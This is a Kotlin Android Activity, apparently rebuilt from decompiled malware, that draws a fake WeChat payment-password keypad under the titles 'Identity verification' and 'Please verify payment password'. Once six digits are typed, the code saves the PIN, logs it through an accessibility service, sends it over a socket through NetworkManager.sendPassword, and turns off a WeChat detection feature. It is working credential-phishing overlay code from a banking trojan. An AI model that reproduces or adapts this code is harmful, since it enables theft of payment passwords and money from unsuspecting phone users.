package com.storm.safe.rock.activity

import android.app.Activity
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.View
import android.view.WindowManager
import android.widget.LinearLayout
import android.widget.TextView
import com.storm.safe.rock.p000.AppStatusManager
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.NetworkManager

/**
 * Custom WeChat payment password input keypad Activity.
 * Builds a 6-digit PIN input UI programmatically with a 4×3 numeric keypad.
 *
 * Reverse-engineered from JADX: activity/izvpcqplqctn.java (315 lines).
 * Renamed: f51914a0→inputBuffer, f51915a1→dotViews, f51916a2→isActive,
 *          m211187a0→dpToPx, m211188a1→onKeyInput, m211189a2→submitPassword,
 *          m211190a3→updateDots
 */
class izvpcqplqctn : Activity() {

    companion object {
        private const val TAG = "izvpcqplqctn"
    }

    var inputBuffer: String = ""
    val dotViews: ArrayList<TextView> = ArrayList()
    var isActive: Boolean = true

    fun dpToPx(dp: Int): Int {
        return (dp * resources.displayMetrics.density).toInt()
    }

    fun onKeyInput(key: String) {
        if (key == "DEL") {
            if (inputBuffer.isNotEmpty()) {
                inputBuffer = inputBuffer.dropLast(1)
                updateDots()
            }
            return
        }
        if (inputBuffer.length < 6) {
            inputBuffer += key
            updateDots()
            if (inputBuffer.length == 6) {
                Handler(Looper.getMainLooper()).postDelayed({
                    submitPassword(inputBuffer)
                    finish()
                }, 300L)
            }
        }
    }

    fun submitPassword(password: String) {
        try {
            try {
                // JADX: C0107as → AppStatusManager.saveWechatPassword
                // Save wechat password
                val type = when (password.length) {
                    4 -> "4digit"
                    6 -> "6digit"
                    else -> "none"
                }
                AppStatusManager.getInstance(this).saveWechatPassword(type, true, password)
                Log.d(TAG, "保存微信密码类型: $type")
            } catch (e: Exception) {
                Log.e(TAG, "保存微信密码到 AppStatusManager 失败", e)
            }

            val svcCompanion = MyAccessibilityService.Companion
            if (svcCompanion.getInstance() != null) {
                val desc = "文本输入: ${password.take(50)}${if (password.length > 50) "..." else ""}"
                MyAccessibilityService.logEvent("TEXT_INPUT", desc)
                try {
                    val svc = svcCompanion.getInstance()
                    val nm = svc?.getNetworkManager()
                    nm?.sendPassword(password, "wechat", "custom_keypad")
                } catch (e: Exception) {
                    Log.e(TAG, "通过Socket发送密码失败", e)
                }
                try {
                    // ADAPT: depends on MyAccessibilityService.disableWechatDetection()
                    svcCompanion.getInstance()?.disableWechatDetection()
                } catch (e: Exception) {
                    Log.e(TAG, "自动关闭微信检测功能失败", e)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "记录微信密码日志失败", e)
        }
    }

    fun updateDots() {
        for (i in 0 until 6) {
            val tv = dotViews[i]
            tv.text = if (i < inputBuffer.length) "●" else ""
            val bg = GradientDrawable()
            bg.setColor(Color.parseColor("#EBEBEB"))
            bg.cornerRadius = dpToPx(6).toFloat()
            tv.background = bg
        }
    }

    override fun onBackPressed() {
        finish()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestWindowFeature(android.view.Window.FEATURE_NO_TITLE)
        window.setBackgroundDrawableResource(android.R.color.white)
        val attrs = window.attributes
        attrs.width = WindowManager.LayoutParams.MATCH_PARENT
        attrs.height = WindowManager.LayoutParams.MATCH_PARENT
        attrs.flags = attrs.flags or 768
        window.attributes = attrs

        // Root layout
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.WHITE)
            layoutParams = LinearLayout.LayoutParams(-1, -1)
        }

        // Header section
        val header = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = android.view.Gravity.CENTER
            setPadding(dpToPx(24), dpToPx(60), dpToPx(24), dpToPx(32))
            layoutParams = LinearLayout.LayoutParams(-1, -2)
        }

        val titleView = TextView(this).apply {
            text = "身份验证"
            textSize = 22f
            setTextColor(Color.parseColor("#111111"))
            gravity = android.view.Gravity.CENTER
            setTypeface(typeface, android.graphics.Typeface.BOLD)
            layoutParams = LinearLayout.LayoutParams(-2, -2).also { it.bottomMargin = dpToPx(10) }
        }

        val subtitleView = TextView(this).apply {
            text = "请验证支付密码确认本人操作"
            textSize = 14f
            setTextColor(Color.parseColor("#888888"))
            gravity = android.view.Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(-2, -2)
        }

        header.addView(titleView)
        header.addView(subtitleView)

        // Dots row
        val dotsRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = android.view.Gravity.CENTER
            setPadding(dpToPx(28), dpToPx(24), dpToPx(28), dpToPx(24))
            layoutParams = LinearLayout.LayoutParams(-1, -2)
        }

        for (i in 0 until 6) {
            val dotSize = dpToPx(48)
            val dot = TextView(this).apply {
                val lp = LinearLayout.LayoutParams(dotSize, dotSize)
                if (i > 0) lp.marginStart = dpToPx(10)
                layoutParams = lp
                gravity = android.view.Gravity.CENTER
                textSize = 22f
                setTextColor(Color.BLACK)
                text = ""
                val bg = GradientDrawable()
                bg.setColor(Color.parseColor("#EBEBEB"))
                bg.cornerRadius = dpToPx(6).toFloat()
                background = bg
            }
            dotViews.add(dot)
            dotsRow.addView(dot)
        }

        // Spacer
        val spacer = View(this).apply {
            layoutParams = LinearLayout.LayoutParams(-1, 0, 1.0f)
        }

        // Keypad
        val keypad = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#D1D5DB"))
            layoutParams = LinearLayout.LayoutParams(-1, -2)
        }

        val keys = arrayOf(
            arrayOf("1", "2", "3"),
            arrayOf("4", "5", "6"),
            arrayOf("7", "8", "9"),
            arrayOf("", "0", "DEL")
        )

        for ((rowIdx, row) in keys.withIndex()) {
            val rowLayout = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                val lp = LinearLayout.LayoutParams(-1, dpToPx(64))
                if (rowIdx > 0) lp.topMargin = dpToPx(1)
                layoutParams = lp
            }

            for ((colIdx, key) in row.withIndex()) {
                val isLast = colIdx == row.size - 1
                val marginEnd = if (isLast) 0 else dpToPx(1)

                when {
                    key.isEmpty() -> {
                        val empty = View(this).apply {
                            val lp = LinearLayout.LayoutParams(0, -1, 1.0f)
                            lp.marginEnd = marginEnd
                            layoutParams = lp
                            setBackgroundColor(Color.parseColor("#D1D5DB"))
                        }
                        rowLayout.addView(empty)
                    }
                    key == "DEL" -> {
                        val del = TextView(this).apply {
                            text = "×"
                            textSize = 22f
                            setTextColor(Color.parseColor("#333333"))
                            gravity = android.view.Gravity.CENTER
                            val lp = LinearLayout.LayoutParams(0, -1, 1.0f)
                            lp.marginEnd = marginEnd
                            layoutParams = lp
                            setBackgroundColor(Color.parseColor("#D1D5DB"))
                            setOnClickListener { onKeyInput("DEL") }
                        }
                        rowLayout.addView(del)
                    }
                    else -> {
                        val btn = TextView(this).apply {
                            text = key
                            textSize = 24f
                            setTextColor(Color.parseColor("#111111"))
                            gravity = android.view.Gravity.CENTER
                            val lp = LinearLayout.LayoutParams(0, -1, 1.0f)
                            lp.marginEnd = marginEnd
                            layoutParams = lp
                            setBackgroundColor(Color.WHITE)
                            setOnClickListener { onKeyInput(key) }
                        }
                        rowLayout.addView(btn)
                    }
                }
            }
            keypad.addView(rowLayout)
        }

        root.addView(header)
        root.addView(dotsRow)
        root.addView(spacer)
        root.addView(keypad)
        setContentView(root)
    }

    override fun onDestroy() {
        super.onDestroy()
    }
}
